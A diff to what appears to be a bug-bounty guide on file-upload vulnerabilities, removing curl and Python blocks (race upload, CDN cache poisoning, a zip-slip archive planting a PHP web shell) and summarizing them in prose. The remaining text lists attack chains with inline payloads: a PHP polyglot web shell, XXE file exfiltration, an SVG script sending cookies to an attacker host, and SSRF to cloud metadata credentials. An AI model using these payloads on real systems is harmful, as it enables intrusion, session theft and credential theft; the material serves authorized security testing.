@@ -150,42 +150,15 @@ curl -s -X POST "https://$TARGET/api/import" \
 
 ## Related Skills & Chains
 
-### Phase X — Processing Race Conditions
-
-```bash
-# Upload file → processor picks it up after delay → race between processor reading and attacker replacing
-# Upload benign image → processor validates OK → attacker overwrites with malicious file before serving
-curl -sk -X PUT "https://target.com/api/upload" -F "file=@evil.php" \
-  -H "X-Override-Token: LEGITIMATE_UPLOAD_TOKEN"
-```
-
-### Phase Y — CDN Cache Poisoning via Upload Headers
-
-```bash
-# Upload a file with harmful response headers → CDN caches the response
-curl -sk -X POST "https://target.com/api/upload/avatar" \
-  -F "file=@image.png" \
-  -H "X-Cache-Control: public, max-age=31536000" \
-  -H "X-Content-Type: text/html"
-# If CDN caches the override, every subsequent GET request serves image.png as text/html
-```
-
-### Phase Z — Zip Slip & Archive Traversal
-
-```bash
-# Create a zip with path traversal entries
-python3 -c "
-import zipfile
-z = zipfile.ZipFile('evil.zip', 'w')
-z.writestr('../../../var/www/html/shell.php', '<?php system(\$_GET[\"c\"]); ?>')
-z.close()
-"
-curl -sk -X POST "https://target.com/api/upload" -F "file=@evil.zip"
-```
-
 - **`hunt-rce`** — File upload is the most common path to RCE on classic PHP/JSP/ASPX stacks once you find a directly-served upload directory or a deserializer-fed processor. Chain primitive: polyglot `GIF89a;<?php system($_GET['c']);?>` bypasses magic-byte check + `.phtml` extension bypasses allowlist → `GET /uploads/shell.phtml?c=id` → RCE; or PHP `phar://` upload to a sink calling `file_exists()` on the attacker-controlled path → PHP object deserialization → RCE.
 - **`hunt-xxe`** — Office formats (DOCX/XLSX/PPTX), SVGs, and SOAP attachments are XML inside a ZIP — every upload-and-parse feature is a latent XXE candidate. Chain primitive: upload DOCX whose `[Content_Types].xml` or `word/document.xml` includes a parameter-entity DTD pointing at attacker-controlled DTD → blind XXE OOB file read → exfil `/etc/passwd` or `web.config` via the document parser.
 - **`hunt-xss`** — SVGs, HTML files, and PDFs uploaded then served on the same origin are stored-XSS factories. Chain primitive: upload SVG with `<script>fetch('//attacker/?'+document.cookie)</script>` → victim views attachment at `app.target.com/uploads/x.svg` (same origin, not sandboxed) → cookie theft → ATO via session hijack.
 - **`hunt-ssrf`** — Image-processing libraries (ImageMagick, ffmpeg) fetch remote URLs from inside the uploaded file. Chain primitive: upload an SVG/MVG with `<image xlink:href="http://169.254.169.254/latest/meta-data/iam/security-credentials/">` or ffmpeg `concat:http://internal/...` → SSRF to AWS IMDS → cloud creds; the ImageTragick CVE-2016-3714 family is still alive on legacy farms.
 - **`security-arsenal`** — Reach for the file-upload bypass tree: 10-row extension/MIME/magic-byte bypass table (double-ext, null-byte, case variants, `.phtml`/`.phar`/`.php5`/`.pht`, `.htaccess` upload to re-enable handlers, `web.config` upload on IIS), SVG/MVG/SVGZ payloads, DOCX-XXE templates, ZIP-slip path traversal in archives, polyglot generators.
 - **`triage-validation`** — Apply the Reproducibility Gate. A file successfully uploaded but never served, never executed, never parsed by anything is not a finding — it's a write-only blob. Critical RCE requires the actual `whoami` round-trip from the uploaded shell; stored XSS requires the popup firing in a victim browser, not just the file existing on disk.
+
+### Phase X — Processing Race & CDN Cache Poisoning
+
+Processing race: upload benign file → processor validates OK → attacker overwrites with malicious file before serving.
+CDN cache poisoning via upload headers: force `Cache-Control: public, max-age=31536000` + `Content-Type: text/html` on an uploaded image.
+Zip Slip: create archive with `../../../var/www/html/shell.php` path traversal entry.
